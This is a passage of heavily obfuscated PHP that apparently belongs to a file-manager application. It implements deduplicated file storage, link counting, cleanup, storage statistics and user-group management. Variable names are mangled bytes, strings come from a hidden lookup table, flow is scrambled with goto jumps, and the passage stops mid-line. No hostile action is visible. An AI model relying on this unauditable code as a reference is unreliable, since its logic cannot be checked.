$B¿…À—ç¨´ =& $_SERVER[ÍÓÖ€°å]; $e¾«³Ä•Åâ = Model($B¿…À—ç¨´[807])->get($B¿…À—ç¨´[1568]); $D…»ÚÏ’ÓŞ = KodIO::defaultIO() . date($B¿…À—ç¨´[1569]); goto b±‹„¨‚Ÿâ; E»ˆ¯ïÊÑÚ: switch ($e¾«³Ä•Åâ) { case $B¿…À—ç¨´[1571]: $eÍé µ¯Í = $eÍé µ¯Í . $B¿…À—ç¨´[90] . $D¡„Éá¹ª->ext($B©±¡é™Šª); if ($D¡„Éá¹ª->ext($B©±¡é™Šª) == $B¿…À—ç¨´[1506]) { $eÍé µ¯Í .= $B¿…À—ç¨´[1572]; } break; case $B¿…À—ç¨´[1573]: goto F¦„åÁ¿; F¦„åÁ¿: $Bƒ™ììŸ—• = Model($B¿…À—ç¨´[807])->get($B¿…À—ç¨´[1574]); $DĞÄÍÍ«èÓ = substr(md5($B¿…À—ç¨´[1280] . $Bƒ™ììŸ—• . date($B¿…À—ç¨´[435])), 0, 8); $D…»ÚÏ’ÓŞ = KodIO::defaultIO() . date($B¿…À—ç¨´[1575]) . $DĞÄÍÍ«èÓ . $B¿…À—ç¨´[8]; goto F˜‹ÑÏ—µ¨; F˜‹ÑÏ—µ¨: if ($D¡„Éá¹ª->ext($B©±¡é™Šª) == $B¿…À—ç¨´[1506]) { $B©±¡é™Šª .= $B¿…À—ç¨´[1572]; } $FñÛÛëù…” = IO::fileNameAuto($D…»ÚÏ’ÓŞ, $B©±¡é™Šª); $eÍé µ¯Í = $D…»ÚÏ’ÓŞ . $FñÛÛëù…”; goto b¯Ÿ¦˜ÚÃ‡; b¯Ÿ¦˜ÚÃ‡: break; goto e’‰–åñ„è; e’‰–åñ„è: case $B¿…À—ç¨´[1570]: break; default: break; } return $eÍé µ¯Í; goto AÁÕÁ àçî; b±‹„¨‚Ÿâ: $eÍé µ¯Í = $D…»ÚÏ’ÓŞ . rand_string(5) . short_id(100); $B©±¡é™Šª = str_replace($B¿…À—ç¨´[8], $B¿…À—ç¨´[71], KodIO::clear($B©±¡é™Šª)); if (!$B©±¡é™Šª) { $e¾«³Ä•Åâ = $B¿…À—ç¨´[1570]; } goto E»ˆ¯ïÊÑÚ; AÁÕÁ àçî: } public function addFileByRemote($cœº×Óµ…ã, $FÏ—–ŠÚôì, $a÷ÅŒ…³ = array()) { goto F‚¶…ÍÇîê; F‚¶…ÍÇîê: $AÆ‚ Ğš… =& $_SERVER[ÍÓÖ€°å]; if (!IO::exist($cœº×Óµ…ã)) { return !1; } $b²èÏùš–Í = $a÷ÅŒ…³[$AÆ‚ Ğš…[151]] ? $a÷ÅŒ…³[$AÆ‚ Ğš…[151]] : $AÆ‚ Ğš…[33]; goto F³©ÒÙÅ¢Ò; BÄÌ£‡ñì: if ($F¤ ã­òµ = $this->addFileCheckExist($EºŞã³’µ[$AÆ‚ Ğš…[152]], $EºŞã³’µ[$AÆ‚ Ğš…[151]], $EºŞã³’µ[$AÆ‚ Ğš…[78]])) { return $F¤ ã­òµ; } $CŞ«¨Ç¬×¢ = $this->add($EºŞã³’µ); return $this->find($CŞ«¨Ç¬×¢); goto DŸ‹ö¥ŠÔ°; F³©ÒÙÅ¢Ò: $Ašö¯„æ’ = IO::hashMd5($cœº×Óµ…ã, $b²èÏùš–Í); $d±áÒ‹­öÁ = KodIO::defaultDriver(); $EºŞã³’µ = array($AÆ‚ Ğš…[382] => IO::size($cœº×Óµ…ã), $AÆ‚ Ğš…[1576] => 1, $AÆ‚ Ğš…[378] => $FÏ—–ŠÚôì, $AÆ‚ Ğš…[495] => $d±áÒ‹­öÁ[$AÆ‚ Ğš…[357]], $AÆ‚ Ğš…[1577] => $cœº×Óµ…ã, $AÆ‚ Ğš…[1578] => $a÷ÅŒ…³[$AÆ‚ Ğš…[152]] ? $a÷ÅŒ…³[$AÆ‚ Ğš…[152]] : IO::hashSimple($cœº×Óµ…ã), $AÆ‚ Ğš…[1579] => $Ašö¯„æ’ ? $Ašö¯„æ’ : $b²èÏùš–Í); goto BÄÌ£‡ñì; DŸ‹ö¥ŠÔ°: } public function addFile($aåëîÄÙ‡˜, $dÕâÚŠ·–Ó, $cŒìªË˜½ = false) { goto b©¹é«ÜÏ—; e¦Ø‰ëè´¡: if ($båè°ƒ‘è = $this->addFileCheckExist($d–Ë³„Ìª‚, $bŒ÷É‚Û§, $aÕ¸¼å¤à)) { return $båè°ƒ‘è; } $D·¦ò×‹Êå = $this->addFileMake($aåëîÄÙ‡˜, $aÕ¸¼å¤à, $d–Ë³„Ìª‚, $bŒ÷É‚Û§, $dÕâÚŠ·–Ó, $cŒìªË˜½); $AÑÕßÚ†®Œ = $this->add($D·¦ò×‹Êå); goto e–ÚŒóå‹ö; b©¹é«ÜÏ—: $d–Ë³„Ìª‚ = IO::hashSimple($aåëîÄÙ‡˜); $bŒ÷É‚Û§ = IO::hashMd5($aåëîÄÙ‡˜); $aÕ¸¼å¤à = IO::size($aåëîÄÙ‡˜); goto e¦Ø‰ëè´¡; e–ÚŒóå‹ö: $båè°ƒ‘è = $this->find($AÑÕßÚ†®Œ); return $båè°ƒ‘è; goto f¨´öÌò¹–; f¨´öÌò¹–: } public function addFileMake($F²‚¨ƒÑ¤È, $F´¥¼Ã¤Ã­, $D´ˆ“Œ¶ß, $d›İí”ìô¢, $d‡Ì¦Ä†ç, $B•¨¼áèç“) { $Aî×„õÊØ =& $_SERVER[ÍÓÖ€°å]; $cŒ˜¯ŒØ¸÷ = $this->createFileName($d‡Ì¦Ä†ç); if ($B•¨¼áèç“) { IO::move($F²‚¨ƒÑ¤È, $cŒ˜¯ŒØ¸÷); } else { IO::copy($F²‚¨ƒÑ¤È, $cŒ˜¯ŒØ¸÷); } $A‚ÜØ’Áˆè = KodIO::defaultDriver(); $a±ã„„…Ãµ = array($Aî×„õÊØ[382] => $F´¥¼Ã¤Ã­, $Aî×„õÊØ[1576] => 1, $Aî×„õÊØ[378] => $d‡Ì¦Ä†ç, $Aî×„õÊØ[495] => $A‚ÜØ’Áˆè[$Aî×„õÊØ[357]], $Aî×„õÊØ[1577] => $cŒ˜¯ŒØ¸÷, $Aî×„õÊØ[1578] => $D´ˆ“Œ¶ß, $Aî×„õÊØ[1579] => $d›İí”ìô¢); return $a±ã„„…Ãµ; } public function addFileCheckExist($F×Óœ²Üª—, $eèÉãë†’, $F¶Š‚Ê¨¥æ) { $a¸×®¼Ö‰ä =& $_SERVER[ÍÓÖ€°å]; $eÛµ¿”Öé¾ = $this->findByHash($F×Óœ²Üª—, $eèÉãë†’); if (!$eÛµ¿”Öé¾) { return !1; } $DÏ¶Ù¸ÈÒŠ = array($a¸×®¼Ö‰ä[1576] => intval($eÛµ¿”Öé¾[$a¸×®¼Ö‰ä[1580]]) + 1, $a¸×®¼Ö‰ä[382] => $F¶Š‚Ê¨¥æ); $this->where(array($a¸×®¼Ö‰ä[381] => $eÛµ¿”Öé¾[$a¸×®¼Ö‰ä[373]]))->save($DÏ¶Ù¸ÈÒŠ); return $eÛµ¿”Öé¾; } public function remove($aµïØÈéƒò) { $this->linkCountChange($aµïØÈéƒò, !1); $this->clearEmpty(); return !0; } public function linkAdd($Dø‰§’Šê) { $this->linkCountChange($Dø‰§’Šê, !0); } public function linkCountChange($f¦ÔÏó® –, $c¾ÇŒÃÎ½Ï) { goto Cè“—×«¯ƒ; ağ„Ê“¯ó·: $f¹™ÈØà = array(); foreach ($f¦ÔÏó® – as $b¨Ï·ÍÛ°‹) { $eÀ¿Ø¤øÅ» = $b¨Ï·ÍÛ°‹ . $cÖ¹ÜÕÀªé[33]; if (!$f¹™ÈØà[$eÀ¿Ø¤øÅ»]) { $f¹™ÈØà[$eÀ¿Ø¤øÅ»] = 0; } $f¹™ÈØà[$eÀ¿Ø¤øÅ»]++; } $bæÄĞ²Ğš» = array(); goto C¬êÕ’Şº¤; C¬êÕ’Şº¤: foreach ($f¹™ÈØà as $b¨Ï·ÍÛ°‹ => $EÈ¨±¡á) { $eÀ¿Ø¤øÅ» = $EÈ¨±¡á . $cÖ¹ÜÕÀªé[33]; if (!$bæÄĞ²Ğš»[$eÀ¿Ø¤øÅ»]) { $bæÄĞ²Ğš»[$eÀ¿Ø¤øÅ»] = array(); } $bæÄĞ²Ğš»[$eÀ¿Ø¤øÅ»][] = $b¨Ï·ÍÛ°‹; } foreach ($bæÄĞ²Ğš» as $EÈ¨±¡á => $dŠÛâï—‡İ) { if (!$dŠÛâï—‡İ) { continue; } $EÈ¨±¡á = $c¾ÇŒÃÎ½Ï ? $EÈ¨±¡á : -intval($EÈ¨±¡á); $c…í¼Ù‰Ø = array($cÖ¹ÜÕÀªé[373] => array($cÖ¹ÜÕÀªé[7], $dŠÛâï—‡İ)); if ($EÈ¨±¡á < 0) { $c…í¼Ù‰Ø[$cÖ¹ÜÕÀªé[1580]] = array($cÖ¹ÜÕÀªé[684], abs($EÈ¨±¡á)); } $this->where($c…í¼Ù‰Ø)->setAdd($cÖ¹ÜÕÀªé[1580], $EÈ¨±¡á); } goto cÚÀº×¶¨š; Cè“—×«¯ƒ: $cÖ¹ÜÕÀªé =& $_SERVER[ÍÓÖ€°å]; if (!$f¦ÔÏó® –) { return; } if (!is_array($f¦ÔÏó® –)) { $f¦ÔÏó® – = array($f¦ÔÏó® –); } goto ağ„Ê“¯ó·; cÚÀº×¶¨š: } public function findByHash($BÍÕË°Ö¼, $a¿¢©¹Ì± = false) { $B÷«ò´Çİ =& $_SERVER[ÍÓÖ€°å]; $B©åò¿½æ = array($B÷«ò´Çİ[1578] => $BÍÕË°Ö¼); if ($a¿¢©¹Ì±) { $B©åò¿½æ = array($B÷«ò´Çİ[1579] => $a¿¢©¹Ì±); } return $this->order($B÷«ò´Çİ[1581])->where($B©åò¿½æ)->find(); } public function clearEmpty($C¥ªØ÷Ÿ¢² = 0) { goto cáá£ò…Œ™; a‡ÃÓ•¶«ƒ: foreach ($D—˜‹²Ğ‚Ÿ as $c¸©Ì É) { $b»ŠË„©óí->update(1); $this->resetFile($c¸©Ì É); } $b»ŠË„©óí->end(); goto BŠˆ¦®Åå; cáá£ò…Œ™: $B™Ú Å­ÕÓ =& $_SERVER[ÍÓÖ€°å]; $DŠøˆËßÌí = time() - 3600 * 24 * $C¥ªØ÷Ÿ¢²; $bóùÎÅÎùö = $B™Ú Å­ÕÓ[1582] . $DŠøˆËßÌí; goto FÕÌƒºÜ§; FÕÌƒºÜ§: $D—˜‹²Ğ‚Ÿ = $this->where($bóùÎÅÎùö)->select(); if (!$D—˜‹²Ğ‚Ÿ) { return; } $b»ŠË„©óí = new Task($B™Ú Å­ÕÓ[1583], $B™Ú Å­ÕÓ[33], count($D—˜‹²Ğ‚Ÿ)); goto a‡ÃÓ•¶«ƒ; BŠˆ¦®Åå: } public function refreshData() { goto b…éÜæöá†; a°©»º“µù: if (!$D¼İ†ÔÂ¤) { return; } $Cœã¦òŠ»à = new Task($e©Î÷ö‰[1584], $e©Î÷ö‰[33], count($D¼İ†ÔÂ¤)); foreach ($D¼İ†ÔÂ¤ as $F¿Úæã ) { $Cœã¦òŠ»à->update(1); if ($this->removeNotExist($F¿Úæã )) { continue; } $this->resetFile($F¿Úæã ); } goto bĞö¨à˜ë; b…éÜæöá†: $e©Î÷ö‰ =& $_SERVER[ÍÓÖ€°å]; $this->refreshSourceHistory(); $D¼İ†ÔÂ¤ = $this->select(); goto a°©»º“µù; bĞö¨à˜ë: $Cœã¦òŠ»à->end(); $this->clearEmpty(); goto d…ééÀ‰; d…ééÀ‰: } private function resetFile($Cê¶«»‘˜•) { goto E¦ìì¬•…Ã; Dæ‘áêÓÁ: if ($Cê¶«»‘˜•[$açŸ¡á·Æê[1580]] != $D…¾Ú´ùíš) { $this->where($F¸„ÕéŠõ½)->save(array($açŸ¡á·Æê[1576] => $D…¾Ú´ùíš)); } goto Dï‚ÆÑ¬¬; E¦ìì¬•…Ã: $açŸ¡á·Æê =& $_SERVER[ÍÓÖ€°å]; $F¸„ÕéŠõ½ = array($açŸ¡á·Æê[381] => $Cê¶«»‘˜•[$açŸ¡á·Æê[373]]); $aÍ©ç¹¿°„ = Model($açŸ¡á·Æê[827])->where($F¸„ÕéŠõ½)->count(); goto F Ş®äÛØÊ; F Ş®äÛØÊ: $Aß¨¶öĞ¿ = Model($açŸ¡á·Æê[1585])->where($F¸„ÕéŠõ½)->count(); $D…¾Ú´ùíš = intval($aÍ©ç¹¿°„) + intval($Aß¨¶öĞ¿); if ($D…¾Ú´ùíš == 0) { IO::remove($Cê¶«»‘˜•[$açŸ¡á·Æê[76]]); $this->where($F¸„ÕéŠõ½)->delete(); return; } goto Dæ‘áêÓÁ; Dï‚ÆÑ¬¬: } private function removeNotExist($Câƒ·­ß´¯) { goto d¥…†ÁÒŞå; d¥…†ÁÒŞå: $AëØâŞ•´ =& $_SERVER[ÍÓÖ€°å]; if (IO::exist($Câƒ·­ß´¯[$AëØâŞ•´[76]])) { return !1; } $this->remove($Câƒ·­ß´¯[$AëØâŞ•´[373]]); goto dÎÎÛ½Çö; dÎÎÛ½Çö: $c›¬Ö†âÅ = array($AëØâŞ•´[381] => $Câƒ·­ß´¯[$AëØâŞ•´[373]]); Model($AëØâŞ•´[827])->where($c›¬Ö†âÅ)->delete(); Model($AëØâŞ•´[1585])->where($c›¬Ö†âÅ)->delete(); goto dòïÌÒ±Üî; dòïÌÒ±Üî: return !0; goto eóËïø†å§; eóËïø†å§: } private function refreshSourceHistory() { $EÔÌæò°±á =& $_SERVER[ÍÓÖ€°å]; $BÅÆÔÃõë  = Model($EÔÌæò°±á[1586])->select(); if (!$BÅÆÔÃõë ) { return; } foreach ($BÅÆÔÃõë  as $A‹î®‡¯˜Ø) { $E„ÒÃÉí¡š = array($EÔÌæò°±á[406] => $A‹î®‡¯˜Ø[$EÔÌæò°±á[365]]); if (!Model($EÔÌæò°±á[827])->where($E„ÒÃÉí¡š)->find()) { Model($EÔÌæò°±á[1586])->where($E„ÒÃÉí¡š)->delete(); } } } public function storageInfo($c¥ì “µæ¬ = false) { goto a°¤òßµ ; a™àƒæÎµÂ: for ($C¯ŞÜ½®Ò = 0; $C¯ŞÜ½®Ò < $eí»ƒª¼Ì; $C¯ŞÜ½®Ò = $C¯ŞÜ½®Ò + $f›‹ÍÆÜÈ‡) { $aä·Ã’ßìÛ = $this->limit($C¯ŞÜ½®Ò, $C¯ŞÜ½®Ò + $f›‹ÍÆÜÈ‡)->select(); foreach ($aä·Ã’ßìÛ as $f¤ŠÍÔºë) { $cîêµ÷å += $f¤ŠÍÔºë[$aÔ†Æ®Ö‚[78]] * $f¤ŠÍÔºë[$aÔ†Æ®Ö‚[1580]]; $aÕ™Ìê²¯ += $f¤ŠÍÔºë[$aÔ†Æ®Ö‚[78]] * ($f¤ŠÍÔºë[$aÔ†Æ®Ö‚[1580]] - 1); $fˆ¢©ƒÒ‹ += $f¤ŠÍÔºë[$aÔ†Æ®Ö‚[1580]]; } } $fğÅĞğöñ = array($aÔ†Æ®Ö‚[1587] => $cîêµ÷å, $aÔ†Æ®Ö‚[1588] => $aÕ™Ìê²¯, $aÔ†Æ®Ö‚[1589] => $aÕ™Ìê²¯ / $cîêµ÷å, $aÔ†Æ®Ö‚[82] => $eí»ƒª¼Ì, $aÔ†Æ®Ö‚[1590] => $fˆ¢©ƒÒ‹); return $fğÅĞğöñ; goto CÅ¤Û¼¢Ã©; fÖçâ½İ¥Ş: $cîêµ÷å = 1; $fˆ¢©ƒÒ‹ = 0; $f›‹ÍÆÜÈ‡ = 5000; goto a™àƒæÎµÂ; a°¤òßµ : $aÔ†Æ®Ö‚ =& $_SERVER[ÍÓÖ€°å]; $eí»ƒª¼Ì = $this->count() + 0.0; $aÕ™Ìê²¯ = 0; goto fÖçâ½İ¥Ş; CÅ¤Û¼¢Ã©: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\x75\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\155\145" => "\147\162\x6f\165\x70\137\x6d\145\164\x61", "\155\145\164\x61\x46\151\x65\x6c\144" => "\x67\162\157\x75\160\111\x44"); protected function cacheFunctionAlias($c«‡¾ßÂ) { $E‡Ö§‹µˆÈ =& $_SERVER[ÍÓÖ€°å]; return array($E‡Ö§‹µˆÈ[1591] => array($c«‡¾ßÂ[0], $E‡Ö§‹µˆÈ[1592]), $E‡Ö§‹µˆÈ[1593] => array($c«‡¾ßÂ[0], $E‡Ö§‹µˆÈ[1592])); } protected function getInfo($Fê—¶Ü¥Î¿) { $d¼â‘ì‘ù‘ = $this->getInfoSimple($Fê—¶Ü¥Î¿); if (!$d¼â‘ì‘ù‘) { return !1; } return $this->_listDataApplyItem($d¼â‘ì‘ù‘); } protected function getInfoSimple($bó¯×»æ , $D‹‘„À“´ = false) { $b¬ğæˆ‚ô„ =& $_SERVER[ÍÓÖ€°å]; if ($D‹‘„À“´) { $cùâ…æ¢£Â = array($b¬ğæˆ‚ô„[1516] => intval($bó¯×»æ )); return $this->where($cùâ…æ¢£Â)->find(); } return $this->cacheFunctionGet($b¬ğæˆ‚ô„[1594], $bó¯×»æ ); } protected function groupAdd($A½ƒÅ‰„–Ã) { goto e»Ô¿µÜ® ; e»Ô¿µÜ® : $DÌÛÈÚ„Ù =& $_SERVER[ÍÓÖ€°å]; if (!$A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[375]] && isset($A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1516]]) && $A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1516]] == 1) { if ($c¶‡äèš÷ = $this->getInfoSimple($A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1516]], !0)) { return $A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1516]]; } } else { $c¶‡äèš÷ = $this->getInfoSimple($A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[375]]); if (!$c¶‡äèš÷) { return !1; } } $b¾ÆÉÁ¸”Â = $DÌÛÈÚ„Ù[1595]; goto E¸çÆ‡Üíæ; E¸çÆ‡Üíæ: if ($c¶‡äèš÷[$DÌÛÈÚ„Ù[364]]) { $b¾ÆÉÁ¸”Â = $c¶‡äèš÷[$DÌÛÈÚ„Ù[364]] . $c¶‡äèš÷[$DÌÛÈÚ„Ù[1516]] . $DÌÛÈÚ„Ù[47]; } $Fø¦¡É¬ºä = array($DÌÛÈÚ„Ù[378] => $this->groupNameAuto($A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[375]], $A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[28]]), $DÌÛÈÚ„Ù[389] => $A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[375]], $DÌÛÈÚ„Ù[390] => $b¾ÆÉÁ¸”Â, $DÌÛÈÚ„Ù[1596] => $A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1500]], $DÌÛÈÚ„Ù[1597] => 0, $DÌÛÈÚ„Ù[1520] => 0); if (!empty($A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1516]])) { $Fø¦¡É¬ºä[$DÌÛÈÚ„Ù[1516]] = $A½ƒÅ‰„–Ã[$DÌÛÈÚ„Ù[1516]]; } goto DÙˆô›ÖĞŠ; DÙˆô›ÖĞŠ: $Fß…ç™÷õ’ = $this->add($Fø¦¡É¬ºä); $this->setNamePinyin($Fß…ç™÷õ’, $Fø¦¡É¬ºä[$DÌÛÈÚ„Ù[28]]); Model($DÌÛÈÚ„Ù[827])->groupRootAdd($Fß…ç™÷õ’); goto A©´È¨àë†; A©´È¨àë†: return $Fß…ç™÷õ’; goto F¬œù‹î†–; F¬œù‹î†–: } protected function groupEdit($e°…Å”»ÕØ, $d…ëˆêÆ±) { $FÍ±…®éÑ¢ =& $_SERVER[ÍÓÖ€°å]; if (!empty($d…ëˆêÆ±[$FÍ±…®éÑ¢[375]])) { $dÔ—â½©ÑŠ = $this->getInfoSimple($e°…Å”»ÕØ); $e¸Âæ•µ¥Â = $this->getInfoSimple($d…ëˆêÆ±[$FÍ±…®éÑ¢[375]]); if (!$dÔ—â½©ÑŠ || !$e¸Âæ•µ¥Â) { return !1; } if ($d…ëˆêÆ±[$FÍ±…®éÑ¢[375]] != $dÔ—â½©ÑŠ[$FÍ±…®éÑ¢[375]]) { if ($e¸Âæ•µ¥Â[$FÍ±…®éÑ¢[364]] !== $dÔ—â½©ÑŠ[$FÍ±…®éÑ¢[364]] && strpos($e¸Âæ•µ¥Â[$FÍ±…®éÑ¢[364]], $dÔ—â½©ÑŠ[$FÍ±…®éÑ¢[364]]) === 0) { return !1; } $d…ëˆêÆ±[$FÍ±…®éÑ¢[390]] = $e¸Âæ•µ¥Â[$FÍ±…®éÑ¢[364]] . $d…ëˆêÆ±[$FÍ±…®éÑ¢[375]] . $FÍ±…®éÑ¢[47]; $this->_changeChildLevel($dÔ—â½©ÑŠ, $e¸Âæ•µ¥Â); } } if (isset($d…ëˆêÆ±[$FÍ±…®éÑ¢[28]])) { $this->setNamePinyin($e°…Å”»ÕØ, $d…ëˆêÆ±[$FÍ±…®éÑ¢[28]]); } return $this->where(array($FÍ±…®éÑ¢[1598] => $e°…Å”»ÕØ))->save($d…ëˆêÆ±); } private function _changeChildLevel($aî£ÒÙ¸Ã, $DÁƒ˜²µ«Ë, $Fâç†°‹’¶ = false) { goto DœÂŸ„Î°¸; DœÂŸ„Î°¸: $Eğ‹Äô·Ï‰ =& $_SERVER[ÍÓÖ€°å]; $d¯æ²Ï¯í‡ = $aî£ÒÙ¸Ã[$Eğ‹Äô·Ï‰[364]] . $aî£ÒÙ¸Ã[$Eğ‹Äô·Ï‰[1516]] . $Eğ‹Äô·Ï‰[47]; $D†í¹±ÎÖÃ = $DÁƒ˜²µ«Ë[$Eğ‹Äô·Ï‰[364]] . $DÁƒ˜²µ«Ë[$Eğ‹Äô·Ï‰[1516]] . $Eğ‹Äô·Ï‰[47] . $aî£ÒÙ¸Ã[$Eğ‹Äô·Ï‰[1516]] . $Eğ‹Äô·Ï‰[47]; goto FÃ™‚ ÛÄ; E×–«§¦Ïï: $this->where($d•…çÍ–ÎÊ)->data($cİ«ÙÍ¬¿Ù)->save(); goto a¸×†Û êÙ; FÃ™‚ ÛÄ: if ($Fâç†°‹’¶) { $D†í¹±ÎÖÃ = $DÁƒ˜²µ«Ë[$Eğ‹Äô·Ï‰[364]] . $DÁƒ˜²µ«Ë[$Eğ‹Äô·Ï‰[1516]] . $Eğ‹Äô·Ï‰[47]; } $d•…çÍ–ÎÊ = array($Eğ‹Äô·Ï‰[390] => array($Eğ‹Äô·Ï‰[399], $aî£ÒÙ¸Ã[$Eğ‹Äô·Ï‰[364]] . $aî£ÒÙ¸Ã[$Eğ‹Äô·Ï‰[1516]] . $Eğ‹Äô·Ï‰[400])); $cİ«ÙÍ¬¿Ù = array($Eğ‹Äô·Ï‰[390] => array($Eğ‹Äô·Ï‰[405], "\162\x65\x70\x6c\x61\143\x65\50\x70\141\x72\x65\156\x74\114\145\166\145\154\54\47{$d¯æ²Ï¯í‡}\x27\54\x27{$D†í¹±ÎÖÃ}\x27\51")); goto E×–«§¦Ïï; a¸×†Û êÙ: } public function setNamePinyin($FìÔğ…çÔò, $EèÆ¼ƒ™¥ = false) { $EÔ„¨ˆ¤Ÿ’ =& $_SERVER[ÍÓÖ€°å]; if (!$EèÆ¼ƒ™¥) { $a‘»™òŸé— = $this->getInfoSimple($FìÔğ…çÔò); $EèÆ¼ƒ™¥ = $a‘»™òŸé—[$EÔ„¨ˆ¤Ÿ’[28]]; } if (!Input::check($EèÆ¼ƒ™¥, $EÔ„¨ˆ¤Ÿ’[394])) { $this->metaSet($FìÔğ…çÔò, $EÔ„¨ˆ¤Ÿ’[395], null); $this->metaSet($FìÔğ…çÔò, $EÔ„¨ˆ¤Ÿ’[396], null); return; } $BöÚğÅ—… = array($EÔ„¨ˆ¤Ÿ’[395] => str_replace($EÔ„¨ˆ¤Ÿ’[50], $EÔ„¨ˆ¤Ÿ’[33], Pinyin::encode($EèÆ¼ƒ™¥)), $EÔ„¨ˆ¤Ÿ’[396] => Pinyin::encode($EèÆ¼ƒ™¥, $EÔ„¨ˆ¤Ÿ’[397])); $this->metaSet($FìÔğ…çÔò, $BöÚğÅ—…); } protected function groupRemove($B¸›ÔÌŞ«Ï) { goto A¦‰ÑÖà÷; cÏÂÄšÓï: $this->where(array($BÎÑîº ùš[375] => $B¸›ÔÌŞ«Ï))->save(array($BÎÑîº ùš[375] => $BÔÑ»«¡Â„[$BÎÑîº ùš[375]])); Model($BÎÑîº ùš[1599])->where($aêÏä—ª‰)->delete(); Model($BÎÑîº ùš[1600])->where($aêÏä—ª‰)->delete(); goto fîÑÂ¤Ã³‹; A¦‰ÑÖà÷: $BÎÑîº ùš =& $_SERVER[ÍÓÖ€°å]; $aêÏä—ª‰ = array($BÎÑîº ùš[1516] => $B¸›ÔÌŞ«Ï); $BÔÑ»«¡Â„ = $this->where($aêÏä—ª‰)->find(); goto aìŒËÒİ¹Å; fîÑÂ¤Ã³‹: Model($BÎÑîº ùš[512])->groupRootRemove($B¸›ÔÌŞ«Ï); return $this->where($aêÏä—ª‰)->delete(); goto fÏïâ˜ğ•×; aìŒËÒİ¹Å: if (!$BÔÑ»«¡Â„ || $BÔÑ»«¡Â„[$BÎÑîº ùš[375]] == 0) { return !1; } $dŞ¾¡”Ä§ = $this->getInfoSimple($BÔÑ»«¡Â„[$BÎÑîº ùš[375]]); $this->_changeChildLevel($BÔÑ»«¡Â„, $dŞ¾¡”Ä§, !0); goto cÏÂÄšÓï; fÏïâ˜ğ•×: } public function listData() { $d·îá£†©‹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($d·îá£†©‹[$_SERVER[ÍÓÖ€°å][345]]); return $d·îá£†©‹; } private function _makeOrder($BËéˆ²’Å = '') { goto EİßòŠ„Ô¶; fçŠäÙÕ¶ì: $BËéˆ²’Å = $BËéˆ²’Å . "{$d‚¼ÈÌÄ±}\40{$d®‹âŞ›È¤}\54\x20\x67\x72\x6f\165\160\x49\x44\x20\x61\163\143"; return $this->order($BËéˆ²’Å); goto dÓ÷æÇ¡‘; d¦“Ÿ‰é¤Ú: $d‚¼ÈÌÄ± = Input::get($f›ù­âÛ‹É[1556], $f›ù­âÛ‹É[7], $f›ù­âÛ‹É[1598], $AÕ†°àÃó©); $d®‹âŞ›È¤ = Input::get($f›ù­âÛ‹É[1558], $f›ù­âÛ‹É[7], $f›ù­âÛ‹É[1603], array($f›ù­âÛ‹É[1603], $f›ù­âÛ‹É[1484])); $d®‹âŞ›È¤ = $EÓÑ–¸†Ó[$d®‹âŞ›È¤]; goto fçŠäÙÕ¶ì; EİßòŠ„Ô¶: $f›ù­âÛ‹É =& $_SERVER[ÍÓÖ€°å]; $AÕ†°àÃó© = array($f›ù­âÛ‹É[1516], $f›ù­âÛ‹É[28], $f›ù­âÛ‹É[1502], $f›ù­âÛ‹É[175]); $EÓÑ–¸†Ó = array($f›ù­âÛ‹É[1601] => $f›ù­âÛ‹É[1602], $f›ù­âÛ‹É[1484] => $f›ù­âÛ‹É[1560]); goto d¦“Ÿ‰é¤Ú; dÓ÷æÇ¡‘: } public function listChild($d¼Œğ–ÁªÑ) { $d¶Çƒ¶¸¤¬ =& $_SERVER[ÍÓÖ€°å]; $c†¤ÏÑîÂĞ = $this->where(array($d¶Çƒ¶¸¤¬[375] => $d¼Œğ–ÁªÑ))->_makeOrder()->selectPage(200); $this->_listDataApply($c†¤ÏÑîÂĞ[$d¶Çƒ¶¸¤¬[345]]); return $c†¤ÏÑîÂĞ; } public function listByID($fÇ†ÁØÚƒ™) { $E°ÁåöÚ–ó =& $_SERVER[ÍÓÖ€°å]; if (!$fÇ†ÁØÚƒ™) { return array(); } $c…ÌÅåÒÌó = array($E°ÁåöÚ–ó[1516] => array($E°ÁåöÚ–ó[7], $fÇ†ÁØÚƒ™)); $EçÚ§»Ş¼ = $this->where($c…ÌÅåÒÌó)->select(); $this->_listDataApply($EçÚ§»Ş¼); return $EçÚ§»Ş¼; } public function listSearch($E©óÎ±ƒÍè) { goto D¦²¦ÑšŠ¤; D¦²¦ÑšŠ¤: $B—–çÌ˜ß’ =& $_SERVER[ÍÓÖ€°å]; $Dé‹‘¦¢“© = $E©óÎ±ƒÍè[$B—–çÌ˜ß’[1604]]; $a‰ÁŒ¸ì = isset($E©óÎ±ƒÍè[$B—–çÌ˜ß’[1605]]) ? $E©óÎ±ƒÍè[$B—–çÌ˜ß’[1605]] : !1; goto D…÷Ö²›Œç; D…÷Ö²›Œç: if (!trim($Dé‹‘¦¢“©)) { return !1; } $Dé‹‘¦¢“© = str_replace($B—–çÌ˜ß’[1606], $B—–çÌ˜ß’[1607], $Dé‹‘¦¢“©); $CÒ½æ¢ì„ = array($B—–çÌ˜ß’[1516] => array($B—–çÌ˜ß’[511], "\x25{$Dé‹‘¦¢“©}\x25"), $B—–çÌ˜ß’[28] => array($B—–çÌ˜ß’[511], "\x25{$Dé‹‘¦¢“©}\45"), $B—–çÌ˜ß’[669] => $B—–çÌ˜ß’[1608]); goto CÑàãµ¿Å…; eÉäÎ½•Š: $this->_listDataApply($DƒÃé°Ø‚Å[$B—–çÌ˜ß’[345]]); return $DƒÃé°Ø‚Å; goto D¾„¸”®Î; CÑàãµ¿Å…: $DƒÃé°Ø‚Å = $this->_makeOrder()->where($CÒ½æ¢ì„)->selectPage(20); $DƒÃé°Ø‚Å = $DƒÃé°Ø‚Å ? $DƒÃé°Ø‚Å : array(); if (!$DƒÃé°Ø‚Å || count($DƒÃé°Ø‚Å[$B—–çÌ˜ß’[345]]) < 5 && Input::check($Dé‹‘¦¢“©, 